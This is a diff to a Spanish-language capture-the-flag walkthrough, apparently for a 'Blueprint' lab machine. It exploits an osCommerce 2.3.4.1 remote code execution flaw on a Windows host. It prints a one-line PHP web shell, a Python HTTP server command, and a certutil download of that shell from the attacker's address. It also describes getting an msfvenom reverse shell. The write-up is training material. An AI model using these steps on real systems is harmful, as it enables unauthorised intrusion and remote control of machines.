@@ -166,7 +166,7 @@ Toda la info del exploit lo tenemos en la url -> https://www.exploit-db.com/expl
     osCommerce 2.3.4.1 - Remote Code Execution (2)                                                     | https://www.exploit-db.com/exploits/50128
     --------------------------------------------------------------------------------------------------- --------------------------------------------
 
-Descargamos el exploit y lo ejecutamos.
+## Explotamos la falla de seguridad
 
   Como vemos al ejecutar exploit este nos devuelve una shell en la cual ejecutamos comandos con permisos de administrador del equipo windows. 
   Datos que nos podrian interesar de cara al futuro.
@@ -186,9 +186,57 @@ Descargamos el exploit y lo ejecutamos.
     OS Version:                6.1.7601 Service Pack 1 Build 7601
     System Type:               X86-based PC
 
-El tipo de shell que nos entrega este exploit no nos permite mucha movilidad, por lo que ya que somos admin del equipo podrimos descargar con la ayuda del comando certutil un fichero en php que nos permita ejecutar comandos a traves de la web(URL), para posteriormente ejecutar una reverse shell y poder trabajar comodamente.  
+El tipo de shell que nos entrega este exploit no nos permite mucha movilidad.
+
+## Conseguimos una Reverse Shell
+
+Ya que somos admin del equipo podrimos descargar con la ayuda del comando certutil un fichero en php que nos permita ejecutar comandos a traves de la web(URL), para posteriormente ejecutar una reverse shell y poder trabajar comodamente.  
 
 Info comando certutil  -> https://tecnonucleous.com/2018/04/05/certutil-exe-podria-permitir-que-los-atacantes-descarguen-malware-mientras-pasan-por-alto-el-antivirus/
+
+Creamos el fichero con el siguiente codigo php, el cual nos permite ejecutar comandos a traves de la url.
+
+        ┌──(root㉿kali)-[/home/…/Desktop/ctf/blueprint/script]
+        └─# cat rce.php                    
+        <?php
+        echo exec($_GET['cmd']);
+        ?>
+
+Montamos un servidor http para compartir nuestro fichero rce.php
+
+        ┌──(root㉿kali)-[/home/…/Desktop/ctf/blueprint/script]
+        └─# python3 -m http.server 80 
+        Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+
+Nos descargamos el fichero desde la maquina windows con certutil
+
+        RCE_SHELL$ certutil -urlcache -f http://10.8.64.232/rce.php rce.php
+        ****  Online  ****
+        CertUtil: -URLCache command completed successfully.
+        
+        RCE_SHELL$ dir
+         Volume in drive C has no label.
+         Volume Serial Number is 14AF-C52C
+        
+         Directory of C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes
+        
+        07/12/2023  05:12 PM    <DIR>          .
+        07/12/2023  05:12 PM    <DIR>          ..
+        04/11/2019  10:52 PM               447 application.php
+        07/12/2023  05:12 PM             1,118 configure.php
+        04/11/2019  10:52 PM    <DIR>          functions
+        07/12/2023  05:12 PM                34 rce.php
+                       3 File(s)          1,599 bytes
+                       3 Dir(s)  19,509,256,192 bytes free
+
+    
+![image](https://github.com/Esevka/CTF/assets/139042999/9eb7dd93-cd4d-4a3a-8b43-c69eee5d5d99)
+    
+![image](https://github.com/Esevka/CTF/assets/139042999/39a79773-a338-4be0-976c-705efc80cabf)
+
+---
+Pues siguiento el proceso anterior creamos una reverse shell con msfvenom, seguidamente nos la descargamos a la maquina windows y la ejecutamos desde nuestro fichero rce.php, obteniendo una reverse shell.
+
 
 
 
